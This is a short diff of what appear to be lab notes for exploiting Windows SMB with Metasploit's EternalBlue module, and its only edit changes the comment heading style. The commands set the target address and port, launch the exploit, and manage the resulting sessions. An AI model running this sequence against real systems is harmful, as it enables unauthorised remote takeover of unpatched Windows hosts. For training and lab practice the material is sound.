@@ -4,21 +4,21 @@ use use exploit/windows/smb/ms17_010_eternalblue
 show payloads
 set payload 2
 
-# set options
+## set options
 
 show options
 set rhosts 10.201.63.250
 set rport 445
 
-# exploit
+## exploit
 
 exploit
 
-# background
+## background
 
 CTRL+Z
 
-# reconnect session
+## reconnect session
 
 sessions
 sessions -h
